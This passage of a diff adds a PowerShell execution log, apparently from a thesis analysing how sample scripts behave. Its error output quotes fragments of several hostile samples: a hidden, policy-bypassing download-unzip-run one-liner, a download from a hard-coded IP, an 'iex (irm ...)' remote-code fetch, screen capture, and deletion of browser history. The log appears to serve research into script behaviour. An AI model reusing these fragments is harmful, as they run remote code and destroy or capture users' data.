+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1magain.←[0m
+Executed {36}
+Executing {37}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\37.ps1
+←[31;1mMethodInvocationException: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\37.ps1:8←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   8 | ←[0m     ←[36;1m$client.DownloadFile($url_ngrok, $file_ngrok)←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mException calling "DownloadFile" with "2" argument(s): "No connection could be made because the target machine←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mactively refused it. [::ffff:64.44.102.190]:80 (64.44.102.190:80)"←[0m
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\37.ps1:13←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  13 | ←[0m     ←[36;1m$destination_ngrok.Copyhere($zip_file_ngrok.items())←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+Executed {37}
+Executing {38}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\38.ps1
+Executed {38}
+Executing {39}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\39.ps1
+Executed {39}
+Executing {4}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\4.ps1
+Executed {4}
+Executing {40}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\40.ps1
+Executed {40}
+Executing {41}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\41.ps1
+←[31;1mParserError: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\41.ps1:4←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   4 | ←[0m ←[36;1m<#←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe terminator '#>' is missing from the multiline comment.←[0m
+Executed {41}
+Executing {42}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\42.ps1
+Executed {42}
+Executing {44}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\44.ps1
+←[31;1mMethodInvocationException: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\44.ps1:37←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  37 | ←[0m     ←[36;1m$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mException calling "CopyFromScreen" with "5" argument(s): "The handle is invalid."←[0m
+Executed {44}
+Executing {46}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1
+←[31;1mREM: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:1←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   1 | ←[0m ←[36;1mREM←[0m Title: ADV-RickRoll←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'REM' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mREM: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:3←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   3 | ←[0m ←[36;1mREM←[0m Author: I am Jakoby←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'REM' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mREM: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:5←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   5 | ←[0m ←[36;1mREM←[0m Description: This is a one liner payload that will Rick Roll your .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'REM' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mREM: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:6←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   6 | ←[0m ←[36;1mREM←[0m Upon deployment, the payload will pause until a mouse movement is .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'REM' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mREM: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:8←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   8 | ←[0m ←[36;1mREM←[0m Target: Windows 10, 11←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'REM' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mREM: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:10←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  10 | ←[0m ←[36;1mREM←[0m ----------------------------------------------------------------- .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'REM' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mREM: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:11←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  11 | ←[0m ←[36;1mREM←[0m THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED. SIMPLY RU .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'REM' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mREM: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:12←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  12 | ←[0m ←[36;1mREM←[0m ----------------------------------------------------------------- .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'REM' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mDELAY: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:14←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  14 | ←[0m ←[36;1mDELAY←[0m 2000←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'DELAY' is not recognized as a name of a cmdlet, function, script file, or executable program. Check←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mthe spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mGUI: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:15←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  15 | ←[0m ←[36;1mGUI←[0m r←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'GUI' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mspelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mDELAY: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:16←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  16 | ←[0m ←[36;1mDELAY←[0m 500←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'DELAY' is not recognized as a name of a cmdlet, function, script file, or executable program. Check←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mthe spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mSTRING: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:17←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  17 | ←[0m ←[36;1mSTRING←[0m powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'STRING' is not recognized as a name of a cmdlet, function, script file, or executable program. Check←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mthe spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+←[31;1mInvoke-WebRequest: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:17←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  17 | ←[0m . .zip';$Z="$env:TMP"+'\rr.zip';$D="$env:TMP"+'\rr';iwr -Uri ←[36;1m$U←[0m -OutFil .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m                                                              ~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot validate argument on parameter 'Uri'. The argument is null or empty. Provide an argument that is not null←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mor empty, and then try the command again.←[0m
+←[31;1mExpand-Archive: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:17←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  17 | ←[0m .  $U -OutFile $Z;←[36;1mExpand-Archive $Z -DestinationPath $D\ -Force←[0m;powersh .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe path 'C:\Users\unina\AppData\Local\Temp\rr.zip' either does not exist or is not a valid file system path.←[0m
+C:\Users\unina\AppData\Local\Temp\rr\rr.ps1 : The term 'C:\Users\unina\AppData\Local\Temp\rr\rr.ps1' is not recognized
+as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was
+included, verify that the path is correct and try again.
+At line:1 char:1
++ C:\Users\unina\AppData\Local\Temp\rr\rr.ps1
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\unina\...\Temp\rr\rr.ps1:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+←[31;1mENTER: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\46.ps1:18←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  18 | ←[0m ←[36;1mENTER←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'ENTER' is not recognized as a name of a cmdlet, function, script file, or executable program. Check←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mthe spelling of the name, or if a path was included, verify that the path is correct and try again.←[0m
+Executed {46}
+Executing {48}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\48.ps1
+←[31;1mGet-ChildItem: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\48.ps1:1←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   1 | ←[0m $Browsers = ←[36;1mGet-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Users\unina\AppData\Local\Google\Chrome\User Data\Default\History' because it does not←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mexist.←[0m
+←[31;1mGet-ChildItem: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\48.ps1:1←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   1 | ←[0m $Browsers = ←[36;1mGet-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Users\unina\AppData\Local\Mozilla\Firefox\Profiles' because it does not exist.←[0m
+←[31;1mNew-Object: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\48.ps1:8←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   8 | ←[0m . onnection = ←[36;1mNew-Object -TypeName System.Data.SQLite.SQLiteConnection(←[0m .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find type [System.Data.SQLite.SQLiteConnection]: verify that the assembly containing this type is loaded.←[0m
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\48.ps1:9←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   9 | ←[0m         ←[36;1m$Connection.Open()←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m         ~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\48.ps1:10←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  10 | ←[0m         ←[36;1m$Command = $Connection.CreateCommand()←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\48.ps1:11←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  11 | ←[0m         ←[36;1m$Command.CommandText = "DELETE FROM urls"←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe property 'CommandText' cannot be found on this object. Verify that the property exists and can be set.←[0m
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\48.ps1:12←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  12 | ←[0m         ←[36;1m$Command.ExecuteNonQuery()←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m         ~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+←[31;1mInvalidOperation: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\48.ps1:13←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  13 | ←[0m         ←[36;1m$Connection.Close()←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m         ~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mYou cannot call a method on a null-valued expression.←[0m
+Executed {48}
+Executing {49}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\49.ps1
+←[31;1mParserError: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\49.ps1:3←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m   3 | ←[0m     ←[36;1m<#←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m     ~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe terminator '#>' is missing from the multiline comment.←[0m
+Executed {49}
+Executing {5}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\5.ps1
+Executed {5}
+Executing {50}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\50.ps1
+←[31;1mRead-Host: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\50.ps1:27←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  27 | ←[0m     $choice = ←[36;1mRead-Host "Answer (y/n)"←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m               ~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mPowerShell is in NonInteractive mode. Read and Prompt functionality is not available.←[0m
+←[31;1mInvoke-RestMethod: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\50.ps1:75←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  75 | ←[0m iex (←[36;1mirm Import-RemoteFunction.tb.ag←[0m)←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mNo such host is known.←[0m
+←[31;1mImport-FunctionIfNotExists: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\50.ps1:76←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  76 | ←[0m ←[36;1mImport-FunctionIfNotExists←[0m -Command Get-Aria2File -ScriptUri "File-Do .←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mThe term 'Import-FunctionIfNotExists' is not recognized as a name of a cmdlet, function, script file, or←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mexecutable program. Check the spelling of the name, or if a path was included, verify that the path is correct←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m←[31;1m←[36;1m←[31;1m←[36;1m     | ←[31;1mand try again.←[0m
+←[31;1mRead-Host: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\50.ps1:96←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m  96 | ←[0m     $num = ←[36;1mRead-Host "Enter a number"←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m            ~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mPowerShell is in NonInteractive mode. Read and Prompt functionality is not available.←[0m
+←[31;1mCopy-Item: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\50.ps1:108←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m 108 | ←[0m ←[36;1mCopy-Item "start-webui.bat" "start-webui-vicuna.bat"←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Windows\System32\start-webui.bat' because it does not exist.←[0m
+←[31;1mGet-Content: ←[0mC:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\50.ps1:111←[0m
+←[31;1m←[0m←[36;1mLine |←[0m
+←[31;1m←[0m←[36;1m←[36;1m 111 | ←[0m     (←[36;1mGet-Content -Path "start-webui-vicuna.bat"←[0m) | ForEach-Object {←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m     | ←[31;1m      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~←[0m
+←[31;1m←[0m←[36;1m←[36;1m←[0m←[36;1m←[0m←[36;1m←[31;1m←[31;1m←[36;1m     | ←[31;1mCannot find path 'C:\Windows\System32\start-webui-vicuna.bat' because it does not exist.←[0m
